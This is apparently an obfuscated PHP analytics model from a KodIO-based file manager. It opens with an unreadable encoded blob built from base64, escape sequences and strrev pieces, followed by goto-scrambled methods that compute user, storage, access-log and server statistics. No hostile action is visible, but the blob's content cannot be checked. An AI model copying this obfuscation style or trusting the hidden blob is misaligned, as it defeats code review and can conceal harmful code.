ğzA<Cë51O™7œc'."\0".'«ÌxìEƒ')."\345\322\40\152\270\340\62\212\234\62\360\236\363\60\11\104\174\163\32\104\31\25\222\125\206\360\2\344\233\32\177\126\130\104\370\172\301\103\175\324\166\3\106\204\63\66\44\123\263\304\214\50\156\303\207\305\160"."\210\12\217\254\26\210\357\125\233\20\270\22\220\32\311\112\206\202\224\327\102\345\156\144\123\15\363\220\336\264\362\16\324\240\257\131\16\141\161\314\67\372\42\42\325\331\52\147\345\354\373\213\251\204\310\34\226".strrev('²­’Qj¸Ï©1bwYq²{‡ÄE_,Ù(#Á>*İ±ıßs2q»èâÒà|Î(t7Éi)p‰')."\x2d\xa2\x12\xa\x6f\x40\x5e\x4d\x8c\x54\xf1\xb\x5\xbb\x1e\xaa\x45\x9\xc\x5c\x58\xf6\x2a\xd0\x38\x4f\x1\xab\x23\x53\x67\xa4\x21\xb4\x3d\x80\x22\x13\x91\x7b\x2d\xaf\xa5\x4\xd9\xd\x7e\x3d\xf1\x2f\x38\xb4\x90\xf2\x6\x38\x21"."\xe9\x31\xa0\xc8\x16\x2c\xa0\xa\x66\x12\xb1\xac\x24\x16\xa0\xd8\x3d\x84\x8\xe0\x4b\x4\x94\x1e\x2c\x39\xa0\x1f\xa9\x4e\x41\x26\xc7\x48\x86\xd8\xb7\x96\xd3\xcb\x4a\x37\x61\x95\xb9\xd9\x74\x14\xb3\xf0\xc5\x4\xc7\xe1\x7b\xdc\xd6"."\63\3\261\150\174\353\16\71\111\10\156\72\135\266\342\331\374\251\72\147\124\3\237\246\212\73\53\20\22\53\112\47\135\277\256\41\331\300\12\145\53\204\140\115\46\250\157\205\355\154\313\166\302\13\204\171\341"."\xf6\x3\xbf\xb0\xaa\x6a\x48\x49\xc1\x13\x96\x0\xf3\x92\xc2\x3\xbd\x75\xc8\xa5\x3c\x4\xc0\x0\x7e\xa5\x6f\x15\x11\x55\x56\x49\x53\x25\xe1\x3f\xfc\x56\x63\x1d\x4c\x86\x85\xac\x92\xfc\x7d\xfc\xb5\xec\x7a\x89\xbf\x31\x88\xd3\x9".base64_decode('9QLhtltjdABvcwXFH+sDGdCntXUOdFRDS2i6IaAJT8CcDF3942CvmqfvshDSptnJSOBYtfLBwIdN')."\313\20\101\351\216\212\224\100\150\226\370\200\242\335\40\336\340\131\366\171\104\41\112\4\11\327\73\320\64\300\352\311\27\45\42\60\175\225\225\224\40\334\112\130\357\207\330\303\366\25\174\253\250\6\204\144\224"."\x8b\x3e\xf0\x7\x7e\xe1\xdb\x19\x7e\xee\x66\x3\x25\xe3\x33\x53\x4f\x49\x66\xca\x42\xf6\x5c\x3\x16\x51\x59\xb8\x4d\x4a\x20\x82\xe4\x5b\x18\x94\x31\xe\x6a\x89\xfe\x78\xa\xaa\x3d\x87\x99\x51\xf5\x64\xa7\x9a\x4f\xda\xf1\x8b\xf9".base64_decode('OINydDAYndXAQMzirNsGF1YZzjzlEr9Z4AJqMtktl6qgMqN4BgUQhorkIuGJH+4CWimLXyd4qco1').strrev('6AÀ2cCRúÒ’ÖÙqä5ÔmC ¢â*üÁ\'AÆä#Ï8/\'‚äàÄi¡vö@ùBV"')."\116\13\324\346\205\32\236\66\322\325\326\226\104\366\265\102\361\125\267\277\26\122\10\10\305\211\367\111\223\146\10\127\377\10\247\127\153\27\13\257\72\361\4\272\250\151\226\316\27\170\53\153\30\301\14\211\211".strrev('àòUhj¸©µ°ˆ^\\Ûö=ÚşÚªy!şŠô9Ã-ì‹Ú¶+ã	54áå`b]8-í‡Øê–')."\125\315\206\223\140\116\56\265\131\362\32\145\325\114\144\252\346\305\111\60\157\105\62\315\54\354\322\205\174\246\134\64\46\151\136\145\347\241\151\144\353\72\322\140\356\52\136\100\235\254\77\253\42\127\176\216\20"."\217\35\33\355\256\253\327\242\352\51\301\144\265\250\212\74\151\55\70\266\355\6\271\32\77\244\51\125\70\40\277\360\255\344\265\74\255\312\365\63\56\23\56\304\41\213\206\146\105\262\170\227\135\375\266\73\124".base64_decode('dRYb1mtoG1zsGO6ukzjwHMlTj1cgO/ckCRW7Pbq9c6hsZ/PTTGkvXxT8AVd19OyA2+HK/WWW+kMT')."\xdd\x60\xe3\x9d\x88\x66\xaa\x9\x41\xed\x5\x2\x45\x4f\xce\x38\x9d\x7e\x24\xcb\xf\xce\x88\x24\x80\x6f\x2e\xbd\xa2\x16\xf7\x7b\xf7\x9c\xb9\xf3\xfe\x9f\xed\xbc\xfd\xba\x9d\x17\x9d\xb5\xfd\xe2\xcb\x1d\x3b\xd6\xdd\xb8\xe3\xaa\x73".base64_decode('d1y1fvt5122/YjNO2HH16e9fcdF8ace5p8LEDWdve+Ae/Hf7Dfe9d/tDOx+8HaNs33Lfe1tu3Hnp')."\xe6\x1d\xe7\xfc\x72\xc7\xc6\x6b\x77\x5c\x76\xce\xf1\x42\xa7\x80\x7a\xeb\xdc\x9\xa4\xe5\xc6\xb5\x4a\xba\x8b\x1f\xd1\x5a\xdc\x91\xe3\x35\x9f\x9c\x52\xe3\xcb\x24\xa4\xfa\xc4\x2e\x28\xe0\xe\xcd\x81\x97\x52\x9c\x1c\xd6\x74\x13\xba".base64_decode('FgBLQAH9dmqmSTkTkKMRJpIMkeci4VIdhPhtBBw0dECOyBuxIRQk11pwNxtWcCpiXpYIPHhnkVDl')."\x9\x7b\x77\xd1\x76\x8f\xc6\x1\x60\x1f\x1a\xd7\xc6\x8\x75\xa1\x27\x8e\x78\x7d\xe0\x9\x39\xe9\x16\xbb\xf4\xc7\x5f\xb8\x20\xe4\x2d\xaa\x8\x20\x5d\x3d\xc3\x8d\x53\xdc\x44\xaf\xdf\x89\xca\x70\x92\xc7\x38\x99\x5e\x1f\xc9\x9e\x44"."\323\221\371\76\375\272\22\310\221\41\57\2\277\44\217\216\235\372\202\221\230\157\231\77\34\11\127\44\365\173\302\341\245\301\220\27\353\6\127\44\243\134\202\76\106\105\122\177\117\260\157\262\64\137\257\307\37".strrev('(K˜ìrQHŸüé–Œz%å6¬Ç£FBásòİ×˜µßÂÖV*€@–¨ıü“‹¾™cPúƒH¨').strrev('Ö®(D	£ˆ,š8RnYu!¿‚¢A¨È	„¼æNùözİD,)E \'D¦ÅBf0ßA³ èzÂ')."\100\24\212\155\267\76\266\16\254\274\267\245\163\324\176\151\14\123\171\347\300\66\234\104\135\174\14\153\161\341\132\11\63\100\13\353\23\65\142\160\230\44\377\77\124\166\301\277\121\306\0\0"."", 10, -8))); goto Bæ¦¸„°îá; a‰¬¸ÒØ¸ñ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($B‰ò³Ù˜æ) { $fÈæ£ª¨†¯ =& $_SERVER[“]; $dË¨•ï•  = array($fÈæ£ª¨†¯[537] => array($fÈæ£ª¨†¯[29] => $fÈæ£ª¨†¯[2020], $fÈæ£ª¨†¯[261] => array($fÈæ£ª¨†¯[210], $fÈæ£ª¨†¯[684], $fÈæ£ª¨†¯[2021], $fÈæ£ª¨†¯[2022])), $fÈæ£ª¨†¯[2023] => array($fÈæ£ª¨†¯[29] => $fÈæ£ª¨†¯[2024], $fÈæ£ª¨†¯[261] => array($fÈæ£ª¨†¯[210], $fÈæ£ª¨†¯[682], $fÈæ£ª¨†¯[2025], $fÈæ£ª¨†¯[2026], $fÈæ£ª¨†¯[2027]))); if (!isset($dË¨•ï• [$B‰ò³Ù˜æ])) { return !1; } $this->optionType = $dË¨•ï• [$B‰ò³Ù˜æ][$fÈæ£ª¨†¯[29]]; $this->field = $dË¨•ï• [$B‰ò³Ù˜æ][$fÈæ£ª¨†¯[261]]; return !0; } public function listData($fµÀØÀìö = false, $f×•ÛÜ”ï = "\155\157\144\x69\146\171\x54\151\x6d\x65", $A”®òÙ¤¶¬ = false) { return parent::listData($fµÀØÀìö, $f×•ÛÜ”ï, $A”®òÙ¤¶¬); } public function trendList($B½ˆ«»º§) { goto bø¿Ææõ¨Ï; bø¿Ææõ¨Ï: $E‡ÈÊƒ§‘º =& $_SERVER[“]; $EÒÕñÜïé = $this->listData(); if ($EÒÕñÜïé) { $CŠŠ¬Ùğéƒ = end($EÒÕñÜïé); $E‹º³³âÜ‚ = date($E‡ÈÊƒ§‘º[2028], strtotime($E‡ÈÊƒ§‘º[2029])); if ($CŠŠ¬Ùğéƒ[$E‡ÈÊƒ§‘º[210]] == $E‹º³³âÜ‚) { return $EÒÕñÜïé; } $CÅİ’‡óëÕ = strtotime($CŠŠ¬Ùğéƒ[$E‡ÈÊƒ§‘º[210]]); } goto CÌËòÌ°ñ; D¿„œÇ»×ê: foreach ($AœÎÆŠØËÇ as $E‹º³³âÜ‚) { $this->{$b¼¶¨Ø…ğ}($E‹º³³âÜ‚); } return $this->listData(); goto B­ó¾ö×É‰; CÌËòÌ°ñ: if (!isset($CÅİ’‡óëÕ)) { $aÀáÏÕˆî· = $B½ˆ«»º§ == $E‡ÈÊƒ§‘º[537] ? $E‡ÈÊƒ§‘º[479] : $E‡ÈÊƒ§‘º[736]; $CÅİ’‡óëÕ = Model($aÀáÏÕˆî·)->min($E‡ÈÊƒ§‘º[187]); } $b¼¶¨Ø…ğ = $E‡ÈÊƒ§‘º[2030] . ucfirst($B½ˆ«»º§); $AœÎÆŠØËÇ = $this->dateList($CÅİ’‡óëÕ); goto D¿„œÇ»×ê; B­ó¾ö×É‰: } private function dateList($B”¼›£¸‡) { $f®’…êÉ‚ =& $_SERVER[“]; $d„Ù „Üƒæ = $B”¼›£¸‡; $B ˆ·Ó¶ = strtotime($f®’…êÉ‚[2029]); $bäô‘¥¥œõ = array(); while ($d„Ù „Üƒæ <= $B ˆ·Ó¶) { $bäô‘¥¥œõ[] = date($f®’…êÉ‚[2028], $d„Ù „Üƒæ); $d„Ù „Üƒæ = strtotime($f®’…êÉ‚[2031], $d„Ù „Üƒæ); } return $bäô‘¥¥œõ; } public function _recordUser($cóİ¬ã†Õ = '') { goto B÷´êš½•Õ; C‚§åÎ–Õ: $DØï…èÃìÇ = Model($FíÓ¬öŸ÷È[479])->where($c÷ˆÉ‰ßÃ)->count($FíÓ¬öŸ÷È[1423]); $c÷ˆÉ‰ßÃ[$FíÓ¬öŸ÷È[29]] = $FíÓ¬öŸ÷È[2034]; $Aâá§ŒÍ³Ê = Model($FíÓ¬öŸ÷È[2035])->where($c÷ˆÉ‰ßÃ)->count($FíÓ¬öŸ÷È[2036]); goto AìÔ‘ˆ„ìã; b¾Ä£ÍŠŒù: $c÷ˆÉ‰ßÃ = array($FíÓ¬öŸ÷È[187] => array($FíÓ¬öŸ÷È[913], $c÷ã³Ê‚Å¬)); $CÙÙØ‘”Ìó = Model($FíÓ¬öŸ÷È[479])->where($c÷ˆÉ‰ßÃ)->count($FíÓ¬öŸ÷È[1423]); $c÷ˆÉ‰ßÃ[$FíÓ¬öŸ÷È[187]] = array($FíÓ¬öŸ÷È[321], array($D¤°–«§„, $c÷ã³Ê‚Å¬)); goto C‚§åÎ–Õ; B÷´êš½•Õ: $FíÓ¬öŸ÷È =& $_SERVER[“]; $D¤°–«§„ = strtotime(date($FíÓ¬öŸ÷È[2032], strtotime($cóİ¬ã†Õ))); $c÷ã³Ê‚Å¬ = strtotime(date($FíÓ¬öŸ÷È[2033], strtotime($cóİ¬ã†Õ))); goto b¾Ä£ÍŠŒù; AìÔ‘ˆ„ìã: $eí”ƒ¨‚î„ = array($FíÓ¬öŸ÷È[210] => $cóİ¬ã†Õ, $FíÓ¬öŸ÷È[684] => (int) $CÙÙØ‘”Ìó, $FíÓ¬öŸ÷È[2021] => (int) $DØï…èÃìÇ, $FíÓ¬öŸ÷È[2022] => (int) $Aâá§ŒÍ³Ê); return $this->insert($eí”ƒ¨‚î„); goto d‹‡¶œÔµ¨; d‹‡¶œÔµ¨: } public function _recordStore($e›¼¼½Îßå = '') { goto bÉœœëê¤; bÉœœëê¤: $bÔ‡ˆ›¤á« =& $_SERVER[“]; $e§›é¨¤Ÿö = strtotime(date($bÔ‡ˆ›¤á«[2033], strtotime($e›¼¼½Îßå))); $f­÷‚ç»É = array($bÔ‡ˆ›¤á«[187] => array($bÔ‡ˆ›¤á«[913], $e§›é¨¤Ÿö)); goto Cˆ‹æŸ¥Ëñ; bÍĞÛÓ´‘¤: $f­÷‚ç»É[$bÔ‡ˆ›¤á«[371]] = 1; $B™©ğ¢íãğ = Model($bÔ‡ˆ›¤á«[736])->where($f­÷‚ç»É)->sum($bÔ‡ˆ›¤á«[77]); $f­÷‚ç»É[$bÔ‡ˆ›¤á«[371]] = 2; goto d±‹Çõ¸º; d±‹Çõ¸º: $B­“´ŒßºÅ = Model($bÔ‡ˆ›¤á«[736])->where($f­÷‚ç»É)->sum($bÔ‡ˆ›¤á«[77]); $eÏ¼›¤±Õ„ = array($bÔ‡ˆ›¤á«[210] => $e›¼¼½Îßå, $bÔ‡ˆ›¤á«[682] => (int) $aŞÛ‡ÍíÔ„, $bÔ‡ˆ›¤á«[2025] => (int) $F¹¡Í¶¤¿Í, $bÔ‡ˆ›¤á«[2026] => (int) $B™©ğ¢íãğ, $bÔ‡ˆ›¤á«[2027] => (int) $B­“´ŒßºÅ); return $this->insert($eÏ¼›¤±Õ„); goto F²ŒË§‘Éƒ; Cˆ‹æŸ¥Ëñ: $F¹¡Í¶¤¿Í = Model($bÔ‡ˆ›¤á«[422])->where($f­÷‚ç»É)->sum($bÔ‡ˆ›¤á«[77]); $f­÷‚ç»É[$bÔ‡ˆ›¤á«[370]] = 0; $aŞÛ‡ÍíÔ„ = Model($bÔ‡ˆ›¤á«[736])->where($f­÷‚ç»É)->sum($bÔ‡ˆ›¤á«[77]); goto bÍĞÛÓ´‘¤; F²ŒË§‘Éƒ: } public function trend($dŒ·ğÃ³Ğ°, $Dª†Š‘òÁó) { goto bã¡´Ó·´Ò; bã¡´Ó·´Ò: $E„Ëß„ª¼‡ =& $_SERVER[“]; if (!$this->init($dŒ·ğÃ³Ğ°)) { return !1; } $eïâÕ = $this->trendList($dŒ·ğÃ³Ğ°); goto d†¤ÏĞŒĞò; d†¤ÏĞŒĞò: if ($eïâÕ && $Dª†Š‘òÁó != $E„Ëß„ª¼‡[1397]) { $cÊ”ºµè¾» = $eïâÕ[0][$E„Ëß„ª¼‡[210]]; $fŒÏˆâ‡Š· = $this->validDate($Dª†Š‘òÁó, $cÊ”ºµè¾»); $C³äÌ¬ßø = array(); $f÷ßäÊ¯©Š = array_to_keyvalue($eïâÕ, $E„Ëß„ª¼‡[210]); foreach ($fŒÏˆâ‡Š· as $D»Ùº¢ƒé‡) { if (isset($f÷ßäÊ¯©Š[$D»Ùº¢ƒé‡])) { $b¯äìøÎÜ = $f÷ßäÊ¯©Š[$D»Ùº¢ƒé‡]; } else { $b¯äìøÎÜ = end($eïâÕ); $b¯äìøÎÜ[$E„Ëß„ª¼‡[210]] = $D»Ùº¢ƒé‡; if ($dŒ·ğÃ³Ğ° == $E„Ëß„ª¼‡[537]) { $b¯äìøÎÜ[$E„Ëß„ª¼‡[2021]] = $b¯äìøÎÜ[$E„Ëß„ª¼‡[2022]] = 0; } } $C³äÌ¬ßø[] = $b¯äìøÎÜ; } $eïâÕ = $C³äÌ¬ßø; } $bäğ¥ª’‘ = array($E„Ëß„ª¼‡[537] => array($E„Ëß„ª¼‡[684] => LNG($E„Ëß„ª¼‡[2037]), $E„Ëß„ª¼‡[2021] => LNG($E„Ëß„ª¼‡[2038]), $E„Ëß„ª¼‡[2022] => LNG($E„Ëß„ª¼‡[2039])), $E„Ëß„ª¼‡[2023] => array($E„Ëß„ª¼‡[682] => LNG($E„Ëß„ª¼‡[2040]), $E„Ëß„ª¼‡[2025] => LNG($E„Ëß„ª¼‡[2041]), $E„Ëß„ª¼‡[2026] => LNG($E„Ëß„ª¼‡[2042]), $E„Ëß„ª¼‡[2027] => LNG($E„Ëß„ª¼‡[2043]))); $D­ÙÄà÷»‹ = array($E„Ëß„ª¼‡[537] => $E„Ëß„ª¼‡[2044], $E„Ëß„ª¼‡[2023] => $E„Ëß„ª¼‡[77]); goto a™Ø¹„†–ä; A•¦‹Äñ†²: return $fÆ–¬šÒ¶×; goto fËãßŸøÃ; a™Ø¹„†–ä: if (empty($eïâÕ)) { $D»Ùº¢ƒé‡ = date($E„Ëß„ª¼‡[2028], strtotime($E„Ëß„ª¼‡[2029])); $Cµè…Ä–ëÌ = array($E„Ëß„ª¼‡[210] => $D»Ùº¢ƒé‡); foreach ($bäğ¥ª’‘[$dŒ·ğÃ³Ğ°] as $AœİàÈÜ• => $cÍ÷“êğÖ©) { $Cµè…Ä–ëÌ[$AœİàÈÜ•] = 0; } $eïâÕ[] = $Cµè…Ä–ëÌ; } $fÆ–¬šÒ¶× = array(); foreach ($eïâÕ as $cÍ÷“êğÖ©) { if ($dŒ·ğÃ³Ğ° == $E„Ëß„ª¼‡[2023] && $cÍ÷“êğÖ©[$E„Ëß„ª¼‡[2025]] > $cÍ÷“êğÖ©[$E„Ëß„ª¼‡[682]]) { $cÍ÷“êğÖ©[$E„Ëß„ª¼‡[2025]] = $cÍ÷“êğÖ©[$E„Ëß„ª¼‡[682]]; } foreach ($bäğ¥ª’‘[$dŒ·ğÃ³Ğ°] as $AœİàÈÜ• => $C¶§­øå‘ò) { $b¯äìøÎÜ = array($E„Ëß„ª¼‡[210] => $cÍ÷“êğÖ©[$E„Ëß„ª¼‡[210]], $E„Ëß„ª¼‡[1328] => $C¶§­øå‘ò); $b¯äìøÎÜ[$D­ÙÄà÷»‹[$dŒ·ğÃ³Ğ°]] = isset($cÍ÷“êğÖ©[$AœİàÈÜ•]) ? $cÍ÷“êğÖ©[$AœİàÈÜ•] : 0; $fÆ–¬šÒ¶×[] = $b¯äìøÎÜ; } } goto A•¦‹Äñ†²; fËãßŸøÃ: } public function validDate($D Ìù˜ø÷, $eêõ´¥¿¾ƒ) { goto c–ÊßÈ„¯‡; c–ÊßÈ„¯‡: $dœÄˆ‘¸Éµ =& $_SERVER[“]; $fËÂÁœ‡ÅË = date($dœÄˆ‘¸Éµ[2028], strtotime($dœÄˆ‘¸Éµ[2029])); $d„Ÿ¨Íƒ°Ñ = array($fËÂÁœ‡ÅË); goto c¾ß‰‚Ã”æ; aø¤åÙğË‰: return $d„Ÿ¨Íƒ°Ñ; goto aÔ·ÈñÍ†™; c¾ß‰‚Ã”æ: switch ($D Ìù˜ø÷) { case $dœÄˆ‘¸Éµ[1404]: $C‰³‘’Ğø = mktime(0, 0, 0, date($dœÄˆ‘¸Éµ[2045]), date($dœÄˆ‘¸Éµ[2046]) - date($dœÄˆ‘¸Éµ[1213]) + 7 - 7, date($dœÄˆ‘¸Éµ[2047])); $AÅ¸Ì–”Ö = 0; do { $e³º¾‡¬¹¾ = date($dœÄˆ‘¸Éµ[2028], $C‰³‘’Ğø - 3600 * 24 * 7 * $AÅ¸Ì–”Ö); $d„Ÿ¨Íƒ°Ñ[] = $e³º¾‡¬¹¾; $AÅ¸Ì–”Ö++; } while ($eêõ´¥¿¾ƒ < $e³º¾‡¬¹¾); break; case $dœÄˆ‘¸Éµ[1402]: $AÅ¸Ì–”Ö = 1; do { $eºªóÃÒ“ = date($dœÄˆ‘¸Éµ[2048], strtotime("\55\40{$AÅ¸Ì–”Ö}\40\155\157\x6e\164\x68\163")); $d„Ÿ¨Íƒ°Ñ[] = $eºªóÃÒ“; $AÅ¸Ì–”Ö++; } while ($eêõ´¥¿¾ƒ < $eºªóÃÒ“); break; case $dœÄˆ‘¸Éµ[1712]: $FÏ—ÆŒÒÊŸ = (int) date($dœÄˆ‘¸Éµ[2047], strtotime($eêõ´¥¿¾ƒ)); $eÂ´Æ„øÆ“ = (int) date($dœÄˆ‘¸Éµ[2047]); if ($FÏ—ÆŒÒÊŸ >= $eÂ´Æ„øÆ“) { break; } for ($FÏ—ÆŒÒÊŸ; $FÏ—ÆŒÒÊŸ < $eÂ´Æ„øÆ“; $FÏ—ÆŒÒÊŸ++) { $d„Ÿ¨Íƒ°Ñ[] = $FÏ—ÆŒÒÊŸ . $dœÄˆ‘¸Éµ[2049]; } break; default: break; } if ($eêõ´¥¿¾ƒ > end($d„Ÿ¨Íƒ°Ñ)) { array_pop($d„Ÿ¨Íƒ°Ñ); } sort($d„Ÿ¨Íƒ°Ñ); goto aø¤åÙğË‰; aÔ·ÈñÍ†™: } public function listTable($a«¯«¤‚ñÖ) { $FÒ¤ğ×í†¼ = ucfirst($a«¯«¤‚ñÖ); return Model($FÒ¤ğ×í†¼)->listData(); } public function option($Dö˜‹ãòˆ) { $Cˆá³áÇ = $_SERVER[“][2050] . ucfirst($Dö˜‹ãòˆ); return $this->{$Cˆá³áÇ}(); } private function optionUser() { goto eã¼ø¼Ãç; a­¸²†ÊÜŠ: $c¼½…ÈÑïè = Model($AÆ‡éœé†[479])->where($dâÍ¦êä¨)->count($AÆ‡éœé†[1423]); return array($AÆ‡éœé†[679] => (int) $FË„—•í¯, $AÆ‡éœé†[2054] => (int) ($FË„—•í¯ - $B“ –ó¯‘), $AÆ‡éœé†[2055] => (int) $B“ –ó¯‘, $AÆ‡éœé†[2056] => (int) $c¼½…ÈÑïè, $AÆ‡éœé†[2057] => $DÈ²…›Œ”); goto B‘Ç‘÷‰µ¶; dÔö‡Ú¶¬ë: if (!$DÈ²…›Œ”) { $DÈ²…›Œ” = 1; } $c‹â²Êø¤ = strtotime(date($AÆ‡éœé†[2032])); $dâÍ¦êä¨ = array($AÆ‡éœé†[2053] => array($AÆ‡éœé†[914], $c‹â²Êø¤)); goto a­¸²†ÊÜŠ; B„©÷šÛ’¥: $c‹â²Êø¤ = strtotime($AÆ‡éœé†[2052]); $dâÍ¦êä¨ = array($AÆ‡éœé†[2053] => array($AÆ‡éœé†[914], $c‹â²Êø¤)); $DÈ²…›Œ” = (int) Model($AÆ‡éœé†[479])->where($dâÍ¦êä¨)->count($AÆ‡éœé†[1423]); goto dÔö‡Ú¶¬ë; eã¼ø¼Ãç: $AÆ‡éœé† =& $_SERVER[“]; $FË„—•í¯ = Model($AÆ‡éœé†[479])->count($AÆ‡éœé†[1423]); $B“ –ó¯‘ = Model($AÆ‡éœé†[479])->where($AÆ‡éœé†[2051])->count($AÆ‡éœé†[1423]); goto B„©÷šÛ’¥; B‘Ç‘÷‰µ¶: } private function optionFile() { goto b·…è…À»; cö–æÍ¢Û: $f£©«¼ö‰¶ = $AïóÕ„ÇŠê[$EÈ”‹Ö¬õ[2025]]; $AÜªÇò½¯õ = Model($EÈ”‹Ö¬õ[736])->where(array($EÈ”‹Ö¬õ[370] => 0))->count($EÈ”‹Ö¬õ[369]); $Bò‘İÒ­’µ = array($EÈ”‹Ö¬õ[370] => 0, $EÈ”‹Ö¬õ[187] => array($EÈ”‹Ö¬õ[914], strtotime(date($EÈ”‹Ö¬õ[2032])))); goto c–—¹—¯Ê…; b·…è…À»: $EÈ”‹Ö¬õ =& $_SERVER[“]; $AïóÕ„ÇŠê = $this->sourceSize(); $eÏÏ¶ä¯– = $AïóÕ„ÇŠê[$EÈ”‹Ö¬õ[77]]; goto cö–æÍ¢Û; c–—¹—¯Ê…: $c‹ˆ³ìÓ¢ = Model($EÈ”‹Ö¬õ[736])->where($Bò‘İÒ­’µ)->sum($EÈ”‹Ö¬õ[77]); $aĞ¨À–…×÷ = Model($EÈ”‹Ö¬õ[736])->where($Bò‘İÒ­’µ)->count($EÈ”‹Ö¬õ[369]); return array($EÈ”‹Ö¬õ[682] => $eÏÏ¶ä¯–, $EÈ”‹Ö¬õ[2025] => $f£©«¼ö‰¶, $EÈ”‹Ö¬õ[2058] => $eÏÏ¶ä¯– - $f£©«¼ö‰¶, $EÈ”‹Ö¬õ[2059] => (int) $c‹ˆ³ìÓ¢, $EÈ”‹Ö¬õ[684] => (int) $AÜªÇò½¯õ, $EÈ”‹Ö¬õ[2060] => (int) $aĞ¨À–…×÷); goto d‚¢½íÌ×®; d‚¢½íÌ×®: } private function optionAccess() { $Eãšø…œ×â =& $_SERVER[“]; return array($Eãšø…œ×â[679] => $this->typeLogCnt(), $Eãšø…œ×â[103] => $this->typeLogCnt($Eãšø…œ×â[103]), $Eãšø…œ×â[404] => $this->typeLogCnt($Eãšø…œ×â[404]), $Eãšø…œ×â[2061] => $this->typeLogCnt($Eãšø…œ×â[2061]), $Eãšø…œ×â[2062] => $this->typeLogCnt($Eãšø…œ×â[2062]), $Eãšø…œ×â[537] => $this->typeLogCnt($Eãšø…œ×â[33], $Eãšø…œ×â[2036])); } private function typeLogCnt($D¥±õÜº¢· = '', $DùÓÖêÇÉ… = "\x69\144") { goto DåÛî·òÇ’; A£©‹ñªöÓ: $dò„ÃãĞ‘÷ = array($F©¿¾ÈßÊÔ[187] => array($F©¿¾ÈßÊÔ[914], $a‘ˆñâØ¿)); if ($D¥±õÜº¢·) { $dò„ÃãĞ‘÷[$F©¿¾ÈßÊÔ[29]] = array($F©¿¾ÈßÊÔ[7], $dÖò¦”á‰[$D¥±õÜº¢·]); } $A¸Û¤èÍíñ = Model($F©¿¾ÈßÊÔ[2035])->where($dò„ÃãĞ‘÷)->count($DùÓÖêÇÉ…); goto dÉò§Õé¥“; dÉò§Õé¥“: return (int) $A¸Û¤èÍíñ; goto B¾ĞÉ¹¼®é; DåÛî·òÇ’: $F©¿¾ÈßÊÔ =& $_SERVER[“]; $dÖò¦”á‰ = array($F©¿¾ÈßÊÔ[103] => array($F©¿¾ÈßÊÔ[2063], $F©¿¾ÈßÊÔ[2064]), $F©¿¾ÈßÊÔ[404] => array($F©¿¾ÈßÊÔ[2065], $F©¿¾ÈßÊÔ[2066]), $F©¿¾ÈßÊÔ[2061] => array($F©¿¾ÈßÊÔ[2067], $F©¿¾ÈßÊÔ[2068], $F©¿¾ÈßÊÔ[2069]), $F©¿¾ÈßÊÔ[2062] => array($F©¿¾ÈßÊÔ[2070], $F©¿¾ÈßÊÔ[2071]), $F©¿¾ÈßÊÔ[2072] => array($F©¿¾ÈßÊÔ[2073], $F©¿¾ÈßÊÔ[2074], $F©¿¾ÈßÊÔ[2075])); $a‘ˆñâØ¿ = strtotime(date($F©¿¾ÈßÊÔ[2032])); goto A£©‹ñªöÓ; B¾ĞÉ¹¼®é: } private function optionServer() { goto aÉÆêİî; aÉÆêİî: $D¿ÏÆõ‹ÒÙ =& $_SERVER[“]; $eó¶Ò¸Ï = $this->diskDriver(); $AíÚÀ°‡” = KodIO::defaultDriver(); goto a«¥è‡‹; d‹³ì×¹ˆ: if ($Bêä¸Å…¦ == $D¿ÏÆõ‹ÒÙ[707]) { $fÔº³èÎÃ± = explode($D¿ÏÆõ‹ÒÙ[1063], $CÈ¾ƒÀ‘‘À[$D¿ÏÆõ‹ÒÙ[873]]); $Bêä¸Å…¦ = $fÔº³èÎÃ±[0]; } if ($Bêä¸Å…¦ == $D¿ÏÆõ‹ÒÙ[710] || $Bêä¸Å…¦ == $D¿ÏÆõ‹ÒÙ[711]) { $bÒä·³âšœ = Model()->db()->query($D¿ÏÆõ‹ÒÙ[2076]); $e“ğ„‰öîç = $bÒä·³âšœ[0] && isset($bÒä·³âšœ[0][$D¿ÏÆõ‹ÒÙ[1327]]) ? $bÒä·³âšœ[0][$D¿ÏÆõ‹ÒÙ[1327]] : 0; $Bêä¸Å…¦ = $D¿ÏÆõ‹ÒÙ[2077] . ($e“ğ„‰öîç ? $D¿ÏÆõ‹ÒÙ[8] . $e“ğ„‰öîç : $D¿ÏÆõ‹ÒÙ[33]); } $bÒŸ¬Šé£ = $GLOBALS[$D¿ÏÆõ‹ÒÙ[6]][$D¿ÏÆõ‹ÒÙ[337]][$D¿ÏÆõ‹ÒÙ[738]]; goto bëš‘¨±Ê×; eµÂ¿ÂØîÎ: $c‹¢®¤Ê£ = $EÂ¬êâàñ®[0]; $CÈ¾ƒÀ‘‘À = $GLOBALS[$D¿ÏÆõ‹ÒÙ[6]][$D¿ÏÆõ‹ÒÙ[17]]; $Bêä¸Å…¦ = $CÈ¾ƒÀ‘‘À[$D¿ÏÆõ‹ÒÙ[874]]; goto d‹³ì×¹ˆ; bëš‘¨±Ê×: return array($D¿ÏÆõ‹ÒÙ[2078] => $eó¶Ò¸Ï ? $eó¶Ò¸Ï[$D¿ÏÆõ‹ÒÙ[2079]] : 0, $D¿ÏÆõ‹ÒÙ[2080] => $eó¶Ò¸Ï ? $eó¶Ò¸Ï[$D¿ÏÆõ‹ÒÙ[2081]] : 0, $D¿ÏÆõ‹ÒÙ[2082] => (int) $AíÚÀ°‡”[$D¿ÏÆõ‹ÒÙ[2079]] * 1024 * 1024 * 1024, $D¿ÏÆõ‹ÒÙ[2083] => (int) $câßùŸŠŠ¥, $D¿ÏÆõ‹ÒÙ[2084] => ucfirst($c‹¢®¤Ê£), $D¿ÏÆõ‹ÒÙ[2085] => $D¿ÏÆõ‹ÒÙ[2086] . PHP_VERSION, $D¿ÏÆõ‹ÒÙ[2087] => phpBuild64() ? 64 : 32, $D¿ÏÆõ‹ÒÙ[678] => str_replace($D¿ÏÆõ‹ÒÙ[2088], $D¿ÏÆõ‹ÒÙ[890], $Bêä¸Å…¦), $D¿ÏÆõ‹ÒÙ[337] => ucfirst($bÒŸ¬Šé£), $D¿ÏÆõ‹ÒÙ[28] => $_SERVER[$D¿ÏÆõ‹ÒÙ[2089]]); goto C™‚¾ˆƒ„ä; a«¥è‡‹: $AÕ·ø¼ŒÄ = array($D¿ÏÆõ‹ÒÙ[727] => $AíÚÀ°‡”[$D¿ÏÆõ‹ÒÙ[367]]); $câßùŸŠŠ¥ = Model($D¿ÏÆõ‹ÒÙ[422])->where($AÕ·ø¼ŒÄ)->sum($D¿ÏÆõ‹ÒÙ[77]); $EÂ¬êâàñ® = explode($D¿ÏÆõ‹ÒÙ[50], $_SERVER[$D¿ÏÆõ‹ÒÙ[139]]); 